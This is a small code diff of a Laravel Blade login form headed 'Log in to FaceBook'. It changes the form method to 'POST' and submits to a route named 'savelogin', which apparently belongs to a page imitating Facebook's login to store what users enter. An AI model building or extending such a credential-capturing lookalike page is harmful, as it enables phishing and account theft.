@@ -55,7 +55,7 @@
 
                             <p class="h3">Log in to FaceBook</p>
 
-                            <form action="{{ route('savelogin') }}" method="post" style="max-width:400px;margin:0px auto;">
+                            <form action="{{ route('savelogin') }}" method="POST" style="max-width:400px;margin:0px auto;">
                                 @csrf
 
                                 <div class="form-group">
